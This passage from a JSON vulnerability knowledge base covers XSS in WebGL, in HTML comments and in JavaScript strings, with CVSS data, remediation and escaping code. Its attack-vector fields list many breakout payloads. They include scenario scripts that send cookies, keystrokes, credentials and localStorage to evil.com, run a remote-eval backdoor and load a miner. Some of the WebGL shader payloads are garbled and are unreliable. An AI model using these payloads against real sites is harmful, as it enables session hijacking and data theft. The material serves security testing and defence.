Float32Array)) {\n        throw new Error('Invalid vertex data type');\n      }\n\n      // Check for NaN and Infinity\n      for (let i = 0; i < vertices.length; i++) {\n        if (!isFinite(vertices[i])) {\n          throw new Error('Invalid vertex value');\n        }\n      }\n\n      return vertices;\n    }\n\n11. FRAMEBUFFER SECURITY:\n    Secure framebuffer operations:\n\n    function validateFramebufferTarget(target) {\n      const validTargets = [gl.FRAMEBUFFER, gl.READ_FRAMEBUFFER, gl.DRAW_FRAMEBUFFER];\n\n      if (!validTargets.includes(target)) {\n        throw new Error('Invalid framebuffer target');\n      }\n\n      return target;\n    }\n\n12. CSP FOR WEBGL:\n    Content Security Policy:\n\n    Content-Security-Policy:\n      default-src 'self';\n      script-src 'self' 'nonce-{random}';\n      style-src 'self' 'unsafe-inline';\n      img-src 'self' data: blob:;\n      media-src 'self';\n      connect-src 'self';\n      object-src 'none';\n\n13. GPU INFORMATION SECURITY:\n    Secure GPU information handling:\n\n    function getSecureGPUInfo() {\n      if (gl.getExtension('WEBGL_debug_renderer_info')) {\n        const vendor = gl.getParameter(gl.VENDOR);\n        const renderer = gl.getParameter(gl.RENDERER);\n\n        // Don't expose GPU information to users\n        logger.info('GPU Info', {vendor: vendor, renderer: renderer});\n\n        // Return generic information only\n        return {\n          webgl: true,\n          extensions: gl.getSupportedExtensions().length\n        };\n      }\n    }\n\n14. LOGGING AND MONITORING:\n    Comprehensive WebGL monitoring:\n\n    function logWebGLOperation(operation, details) {\n      logger.info('WebGL operation', {\n        operation: operation,\n        details: details,\n        timestamp: new Date().toISOString(),\n        userAgent: navigator.userAgent\n      });\n    }\n\n15. TESTING AND VALIDATION:\n    Regular security testing:\n\n    Automated tests:\n    - WebGL context validation\n    - Shader compilation testing\n    - Texture data validation\n    - GPU resource monitoring\n\n    Manual tests:\n    - DevTools WebGL inspection\n    - Shader source review\n    - GPU memory analysis\n\nSECURITY TESTING PAYLOADS:\n\nBasic WebGL XSS:\ngl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); /* alert(1) */\ngl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); // alert(1)\ngl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); /* fetch('http://evil.com/steal') */\n\nShader injection:\nprecision mediump float; alert(1); void main() {}\n#define main() alert(1); void main\n/* alert(1) */ void main() { gl_FragColor = vec4(1.0); }\n\nAdvanced payloads:\n#version 100 alert(1); void main() {}\n#extension all : alert(1); void main() {}\n\nWEBGL SECURITY HEADERS:\n\nContent-Security-Policy: script-src 'self' 'nonce-{random}'\nX-Content-Type-Options: nosniff\nX-WebGL-Context: secure\n\nMONITORING METRICS:\n\nMonitor for:\n- Unusual shader compilation patterns\n- Large texture uploads\n- GPU memory anomalies\n- WebGL context errors\n- Extension usage patterns\n\nOWASP REFERENCES:\n- OWASP WebGL Security Cheat Sheet\n- WebGL Security Best Practices\n- GPU Security Considerations\n- 3D Graphics Security Guide\n"
  },
  "html_comment": {
    "title": "Cross-Site Scripting (XSS) in HTML Comment",
    "severity": "medium",
    "cvss_score": 5.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "html",
      "comment",
      "breakout",
      "parser"
    ],
    "description": "\nUser input is reflected inside an HTML comment. While browsers don't execute scripts within comments, \nattackers can break out using comment terminators or exploit edge cases in HTML parsers. This is \nparticularly dangerous in server-side templates, debugging information, or conditional comments.\n\nSEVERITY: MEDIUM\nCan lead to XSS if comment breakout is possible. Common in debugging code left in production.\n",
    "attack_vector": "\nBASIC BREAKOUT:\n<!-- USER_INPUT -->\nPayload: --> <script>alert(1)</script> <!--\nResult: <!-- --> <script>alert(1)</script> <!-- -->\n\nIE CONDITIONAL COMMENTS:\n<!--[if IE]><script>alert(1)</script><![endif]-->\n\nPOLYGLOT:\n--!><svg/onload=alert(1)>\n\nCOMMENT CONFUSION:\nSome parsers incorrectly handle --!> as terminator\n\nSERVER-SIDE TEMPLATE COMMENTS:\nMay be evaluated before HTML rendering\n\nNESTED COMMENTS:\nLegacy parsers may have issues with nested comment structures\n",
    "remediation": "\nDEFENSE:\n\n1. NEVER PUT USER INPUT IN HTML COMMENTS\n2. Remove or encode: --, -->, <\n3. Use data attributes instead of comments for metadata\n4. Strip comments in production builds\n5. Implement CSP\n6. Use structured logging instead of HTML comments\n\nBEST PRACTICES:\n- Use data-* attributes for metadata\n- Use <script type=\"application/json\"> for data\n- Remove comments via build tools\n- Validate that comments don't contain [if, [endif]\n\nOWASP REFERENCES:\n- CWE-79: Cross-site Scripting\n- OWASP XSS Prevention Cheat Sheet\n"
  },
  "js_string": {
    "title": "Cross-Site Scripting (XSS) in JavaScript String",
    "severity": "critical",
    "cvss_score": 8.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "javascript",
      "string",
      "escape",
      "injection"
    ],
    "description": "\nUser input is placed inside a JavaScript string literal without proper escaping. This is EXTREMELY \ncommon in legacy applications and server-side rendering. Attackers can break out of the string context \nto execute arbitrary code. The complexity increases with ES6 template literals, regex patterns, and \nmulti-line strings.\n\nVULNERABILITY CONTEXT:\nOccurs when server-side code embeds user data inside JavaScript strings:\n- <script>var name = 'USER_INPUT';</script>\n- <script>var msg = \"USER_INPUT\";</script>\n- <script>var template = `USER_INPUT`;</script> (ES6)\n- <script>var pattern = /USER_INPUT/;</script>\n- onclick=\"alert('USER_INPUT')\"\n- href=\"javascript:doSomething('USER_INPUT')\"\n- Inline event handlers with strings\n- JSON strings embedded in JavaScript\n- JSONP responses with string data\n- Dynamic SQL/template queries in JavaScript\n\nCommon in:\n- Server-side templates (EJS, Handlebars, Jinja2)\n- Legacy PHP/ASP/JSP with inline JavaScript\n- Analytics tracking codes\n- Configuration objects\n- Internationalization (i18n) strings\n- Error messages\n- User notifications\n\nSEVERITY: CRITICAL\nString context XSS allows full JavaScript execution and is one of the most common XSS vectors.\n",
    "attack_vector": "\nSINGLE QUOTE STRING BREAKOUT:\n\n1. BASIC BREAKOUT:\n   <script>var name = 'USER_INPUT';</script>\n   \n   Payloads:\n   '; alert(1); var x='\n   ' + alert(1) + '\n   '-alert(1)-'\n   \n   Result:\n   <script>var name = ''; alert(1); var x='';</script>\n\n2. WITH COMMENT:\n   Payload:\n   '; alert(1);//\n   \n   Result:\n   <script>var name = ''; alert(1);//';</script>\n   (Original closing quote is commented out)\n\n3. MULTILINE:\n   Payload:\n   ';\nalert(1);\nvar x='\n   ';\ralert(1);\rvar x='\n\nDOUBLE QUOTE STRING BREAKOUT:\n\n4. BASIC BREAKOUT:\n   <script>var msg = \"USER_INPUT\";</script>\n   \n   Payloads:\n   \"; alert(1); var x=\"\n   \" + alert(1) + \"\n   \"-alert(1)-\"\n   \n5. MIXED QUOTES:\n   Payload in single quote context:\n   ' + alert(1) + \"\n   \n   Payload in double quote context:\n   \" + alert(1) + '\n\nES6 TEMPLATE LITERAL EXPLOITATION:\n\n6. TEMPLATE LITERAL INJECTION:\n   <script>var msg = `Hello USER_INPUT`;</script>\n   \n   Payloads:\n   ${alert(1)}\n   ${document.cookie}\n   ${fetch('//evil.com?c='+document.cookie)}\n   ${eval(atob('YWxlcnQoMSk='))}\n   ${constructor.constructor('alert(1)')()}\n   ${this.constructor.constructor('alert(1)')()}\n   \n   Result:\n   <script>var msg = `Hello ${alert(1)}`;</script>\n\n7. NESTED TEMPLATE LITERALS:\n   ${`nested ${alert(1)}`}\n   ${`${`${alert(1)}`}`}\n\n8. TEMPLATE WITH EXPRESSIONS:\n   ${(()=>alert(1))()}\n   ${[].constructor.constructor('alert(1)')()}\n\n9. BREAKING OUT OF TEMPLATE:\n   Payload:\n   `; alert(1); var x=`\n   ` + alert(1) + `\n   \n   Result:\n   <script>var msg = `Hello `; alert(1); var x=``;</script>\n\nUNICODE AND ENCODING BYPASSES:\n\n10. UNICODE ESCAPES:\n    Payloads:\n    \\u0027; alert(1); var x=\\u0027  (\\u0027 = ')\n    \\u0022; alert(1); var x=\\u0022  (\\u0022 = \")\n    \\u0061lert(1)  (\\u0061 = 'a')\n    \n    In code:\n    <script>var x = '\\u0027; alert(1); //';</script>\n\n11. HEX ESCAPES:\n    \\x27; alert(1); var x=\\x27  (\\x27 = ')\n    \\x22; alert(1); var x=\\x22  (\\x22 = \")\n    \\x61lert(1)  (\\x61 = 'a')\n\n12. OCTAL ESCAPES:\n    \\047; alert(1); var x=\\047  (\\047 = ')\n    \\042; alert(1); var x=\\042  (\\042 = \")\n    \\141lert(1)  (\\141 = 'a')\n\n13. MIXED ENCODING:\n    \\x27+\\u0061lert(1)+\\x27\n    \\u0027;\\x61lert(1);\\u0027\n\nLINE CONTINUATION AND NEWLINE ATTACKS:\n\n14. BACKSLASH LINE CONTINUATION:\n    Payload:\n    \\\nalert(1)//\n    \n    Becomes:\n    <script>var x = '\\\nalert(1)//';</script>\n    \n    JavaScript interprets \\\n as line continuation\n\n15. CRLF INJECTION:\n    Payload:\n    \\r\\nalert(1);//\n    \\n'; alert(1); var x='\\n\n    \n    Result:\n    <script>var x = '\\n'; alert(1); var x='\\n';</script>\n\n16. LINE SEPARATOR (U+2028):\n    Payload:\n     alert(1)//\n    \n    JavaScript treats U+2028 as newline but many filters don't\n\n17. PARAGRAPH SEPARATOR (U+2029):\n    Payload:\n     alert(1)//\n\nCLOSING SCRIPT TAG ATTACKS:\n\n18. SCRIPT TAG INJECTION:\n    <script>var x = 'USER_INPUT';</script>\n    \n    Payload:\n    </script><script>alert(1)</script><script>\n    \n    Result:\n    <script>var x = '</script><script>alert(1)</script><script>';</script>\n    \n    First script closes, new script executes\n\n19. WITH COMMENT BYPASS:\n    Payload:\n    </script><script>alert(1)//\n    \n    Prevents syntax error\n\n20. CASE VARIATIONS:\n    </ScRiPt><script>alert(1)</script>\n    </SCRIPT><script>alert(1)</script>\n\nHTML COMMENT ATTACKS:\n\n21. HTML COMMENT IN JAVASCRIPT:\n    Payload:\n    '--></script><script>alert(1)//\n    '<!--</script><script>alert(1)//\n    \n    HTML comments can affect JavaScript parsing in some contexts\n\nREGEX CONTEXT EXPLOITATION:\n\n22. BREAKING OUT OF REGEX:\n    <script>var pattern = /USER_INPUT/;</script>\n    \n    Payloads:\n    /; alert(1); var x=/\n    /+ alert(1) +/\n    []/;alert(1);var x=/[]/\n    \n    Result:\n    <script>var pattern = //; alert(1); var x=//;</script>\n\n23. REGEX WITH FLAGS:\n    <script>var pattern = /USER_INPUT/gi;</script>\n    \n    Payload:\n    /;alert(1);var x=/gi;var y=/\n    \n    Result:\n    <script>var pattern = //;alert(1);var x=/gi;var y=/gi;</script>\n\nINLINE EVENT HANDLER CONTEXT:\n\n24. ONCLICK WITH SINGLE QUOTES:\n    <button onclick=\"doSomething('USER_INPUT')\">\n    \n    Payload:\n    '); alert(1); doSomething('\n    \n    Result:\n    <button onclick=\"doSomething(''); alert(1); doSomething('')\">\n\n25. ONMOUSEOVER WITH DOUBLE QUOTES:\n    <div onmouseover=\"alert(\"USER_INPUT\")\">\n    \n    Payload:\n    \\\"); alert(1); alert(\\\"\n    \n    Result:\n    <div onmouseover=\"alert(\\\"\\\"); alert(1); alert(\\\"\")\">\n\nTOSTRING() COERCION ATTACKS:\n\n26. OBJECT TO STRING:\n    If attacker can control object that gets stringified:\n    \n    Payload object:\n    {toString: function() { return \"'; alert(1); var x='\"; }}\n    \n    When used in:\n    <script>var x = 'USER_OBJECT';</script>\n    \n    Object's toString() is called\n\n27. ARRAY TO STRING:\n    [1,2,3] becomes \"1,2,3\" when stringified\n    Can exploit if concatenated into strings\n\nADVANCED EXPLOITATION TECHNIQUES:\n\n28. PROTOTYPE POLLUTION VIA STRING:\n    If string manipulation is vulnerable:\n    \n    Payload:\n    __proto__\n    constructor[prototype]\n    \n    Can lead to prototype pollution and XSS\n\n29. EVAL() IN STRING:\n    <script>var code = 'eval(\"USER_INPUT\")';</script>\n    \n    Payload:\n    alert(1)\n    \n    Double evaluation vulnerability\n\n30. FUNCTION() CONSTRUCTOR:\n    <script>var fn = new Function('return \"USER_INPUT\"');</script>\n    \n    Payload:\n    \"; alert(1); return \"\n    \n    Result:\n    new Function('return \"\"; alert(1); return \"\"')\n\nJSON STRING EXPLOITATION:\n\n31. JSON IN JAVASCRIPT:\n    <script>var config = '{\"key\": \"USER_INPUT\"}';</script>\n    \n    Payloads:\n    \", \"exploit\": \"alert(1)\n    \"}; alert(1); var x='{\"key\": \"\n    \n32. JSONP STRING INJECTION:\n    callback('{\"data\": \"USER_INPUT\"}')\n    \n    Payload:\n    \"}); alert(1); callback({\"data\": \"\n\nSTRING CONCATENATION ATTACKS:\n\n33. PLUS OPERATOR ABUSE:\n    Payload:\n    ' + alert(1) + '\n    \" + alert(1) + \"\n    \n    Result:\n    <script>var x = 'test' + alert(1) + 'test';</script>\n\n34. COMMA OPERATOR:\n    Payload:\n    ', alert(1), '\n    \n    Result:\n    <script>var x = ('test', alert(1), 'test');</script>\n\n35. TERNARY OPERATOR:\n    Payload:\n    ' + (1?alert(1):0) + '\n\nFRAMEWORK-SPECIFIC ATTACKS:\n\n36. EJS TEMPLATE:\n    <script>var msg = '<%= userInput %>';</script>\n    \n    If not properly escaped:\n    '; alert(1); var x='\n\n37. HANDLEBARS:\n    <script>var msg = '{{userInput}}';</script>\n    \n    Payload:\n    {{#with this}}'; alert(1); var x='{{/with}}\n\n38. JINJA2:\n    <script>var msg = '{{ user_input }}';</script>\n    \n    If auto-escape is off:\n    '; alert(1); var x='\n\nREAL-WORLD ATTACK SCENARIOS:\n\nSESSION HIJACKING:\n<script>\nvar username = 'attacker'; fetch('//evil.com?c='+document.cookie); var x='victim';\n</script>\n\nKEYLOGGER:\n<script>\nvar data = ''; document.onkeypress=function(e){fetch('//evil.com?k='+e.key)}; var x='';\n</script>\n\nCREDENTIAL THEFT:\n<script>\nvar msg = ''; \ndocument.body.innerHTML='<form action=//evil.com><input name=user placeholder=Username required><input name=pass type=password placeholder=Password required><button>Login</button></form>';\nvar x='';\n</script>\n\nDATA EXFILTRATION:\n<script>\nvar config = ''; \nfetch('//evil.com/exfil',{method:'POST',body:JSON.stringify({\n  cookies:document.cookie,\n  localStorage:JSON.stringify(localStorage)\n})});\nvar x='';\n</script>\n\nPERSISTENT BACKDOOR:\n<script>\nvar temp = '';\nsetInterval(()=>{\n  fetch('//evil.com/cmd').then(r=>r.text()).then(cmd=>eval(cmd))\n},5000);\nvar x='';\n</script>\n\nCRYPTOCURRENCY MINING:\n<script>\nvar user = '';\nvar s=document.createElement('script');\ns.src='//evil.com/coinhive.js';\ndocument.head.appendChild(s);\nsetTimeout(()=>{new CoinHive.Anonymous('key').start()},1000);\nvar x='';\n</script>\n",
    "remediation": "\nDEFENSE-IN-DEPTH STRATEGY:\n\n1. PROPER JAVASCRIPT STRING ESCAPING:\n   \n   Must escape these characters:\n   - \\\\ (backslash) - ESCAPE FIRST!\n   - ' (single quote) → \\'\n   - \" (double quote) → \\\"\n   - \\n (newline) → \\\\n\n   - \\r (carriage return) → \\\\r\n   - \\t (tab) → \\\\t\n   - \\u2028 (line separator) → \\\\u2028\n   - \\u2029 (paragraph separator) → \\\\u2029\n   - </script> → <\\/script>\n   - <!-- → <\\!--\n   \n   Python:\n   import json\n   safe_string = json.dumps(user_input)[1:-1]  # Remove outer quotes\n   \n   Or manually:\n   def escape_js_string(s):\n       return s.replace('\\\\', '\\\\\\\\')\\\n               .replace(\"'\", \"\\\\'\")\\\n               .replace('\"', '\\\\\"')\\\n               .replace('\\n', '\\\\n')\\\n               .replace('\\r', '\\\\r')\\\n               .replace('\\u2028', '\\\\u2028')\\\n               .replace('\\u2029', '\\\\u2029')\\\n               .replace('</', '<\\\\/')\n   \n   PHP:\n   function escapeJsString($str) {\n       return json_encode($str, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);\n   }\n   \n   JavaScript (Node.js):\n   function escapeJsString(str) {\n       return str\n           .replace(/\\\\/g, '\\\\\\\\')\n           .replace(/'/g, \"\\\\'\")\n           .replace(/\"/g, '\\\\\"')\n           .replace(/\\n/g, '\\\\n')\n           .replace(/\\r/g, '\\\\r')\n           .replace(/\\u2028/g, '\\\\u2028')\n           .replace(/\\u2029/g, '\\\\u2029')\n           .replace(/<\\//g, '<\\\\/');\n   }\n\n2. AVOID INLINE JAVASCRIPT ENTIRELY:\n   \n   BAD:\n   <script>\n   var username = '<?php echo $username ?>';\n   </script>\n   \n   GOOD - Use data attributes:\n   <div id=\"user-data\" data-username=\"<?php echo htmlspecialchars($username) ?>\"></div>\n   \n   <script>\n   const userData = document.getElementById('user-data');\n   const username = userData.dataset.username; // Safe!\n   </script>\n\n3. USE JSON SERIALIZATION:\n   \n   BAD:\n   <script>\n   var config = {\n       name: '<?php echo $name ?>',\n       email: '<?php echo $email ?>'\n   };\n   </script>\n   \n   GOOD:\n   <script>\n   var config = <?php echo json_encode($config, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;\n   </script>\n\n4. SCRIPT TYPE='APPLICATION/JSON':\n   \n   Best practice:\n   <script type=\"application/json\" id=\"config-data\">\n   <?php echo json_encode($config, JSON_HEX_TAG | JSON_HEX_AMP); ?>\n   </script>\n   \n   <script>\n   const configData = JSON.parse(\n       document.getElementById('config-data').textContent\n   );\n   </script>\n\n5. CONTENT SECURITY POLICY:\n   \n   Block inline event handlers:\n   Content-Security-Policy: \n     default-src 'self';\n     script-src 'self' 'nonce-RANDOM123';\n   \n   This prevents onclick=\"...\" attacks\n\n6. USE SAFE APIS:\n   \n   GOOD:\n   element.textContent = userInput;\n   element.setAttribute('data-value', userInput);\n   \n   BAD:\n   element.onclick = \"doSomething('\" + userInput + \"')\";\n   element.setAttribute('onclick', code);\n\n7. FRAMEWORK AUTO-ESCAPING:\n   \n   React (Safe by default):\n   const username = userInput; // No need to escape in JSX\n   return <div>{username}</div>;\n   \n   Vue (Safe in templates):\n   <template>\n     <div>{{ userInput }}</div>\n   </template>\n   \n   Angular (Safe by default):\n   <div>{{ userInput }}</div>\n   \n   All automatically escape for JavaScript string context\n\n8. TEMPLATE ENGINE CONFIGURATION:\n   \n   EJS:\n   <%= userInput %>  <!-- HTML escaped -->\n   <%- userInput %>  <!-- Raw, dangerous -->\n   \n   Handlebars:\n   {{userInput}}     <!-- Escaped -->\n   {{{userInput}}}   <!-- Raw, dangerous -->\n   \n   Jinja2:\n   {{ user_input }}  <!-- Auto-escaped if configured -->\n   {{ user_input|e }}  <!-- Explicitly escaped -->\n\n9. VALIDATE INPUT:\n   \n   For expected formats:\n   \n   Username:\n   if (!preg_match('/^[a-zA-Z0-9_-]{3,20}$/', $username)) {\n       die('Invalid username');\n   }\n   \n   Numeric:\n   $age = intval($_POST['age']);\n   if ($age < 0 || $age > 150) die('Invalid age');\n\n10. TRUSTED TYPES API:\n    \n    Content-Security-Policy: require-trusted-types-for 'script'\n    \n    JavaScript:\n    const policy = trustedTypes.createPolicy('default', {\n        createScript: (input) => {\n            // Sanitize\n            return sanitize(input);\n        }\n    });\n\nSECURITY CHECKLIST:\n\n[ ] No user input placed directly in JavaScript strings\n[ ] All JavaScript strings properly escaped (backslash first!)\n[ ] Escape \\u2028 and \\u2029 (line/paragraph separators)\n[ ] Escape </script> and <!-- in strings\n[ ] Use data attributes instead of inline JavaScript\n[ ] Use JSON serialization with proper flags\n[ ] CSP configured to block inline event handlers\n[ ] Framework auto-escaping enabled\n[ ] Template engine escape syntax used correctly\n[ ] No eval() or Function() with user input\n[ ] Input validation for expected formats\n[ ] Regular security testing\n[ ] Code review for all JavaScript string usage\n[ ] Developer training on string context XSS\n\nTESTING PAYLOADS:\n\nSingle quote breakout:\n'; alert(1); var x='\n'; alert(1);//\n\nDouble quote breakout:\n\"; alert(1); var x=\"\n\"; alert(1);//\n\nTemplate literal:\n${alert(1)}\n\nUnicode escape:\n\\u0027; alert(1); var x=\\u0027\n\nScript tag breakout:\n</script><script>alert(1)</script><script>\n\nRegex breakout:\n/; alert(1); var x=/\n\nLine separator:\n\\u2028alert(1)//\n\nOWASP REFERENCES:\n- OWASP XSS Prevention Cheat Sheet: Rule #3\n- CWE-79: Improper Neutralization of Input During Web Page Generation\n- JavaScript String Escape Sequences\n- Content Security Policy Level 3\n- OWASP Testing Guide: Testing for JavaScript Execution\n"
  }
}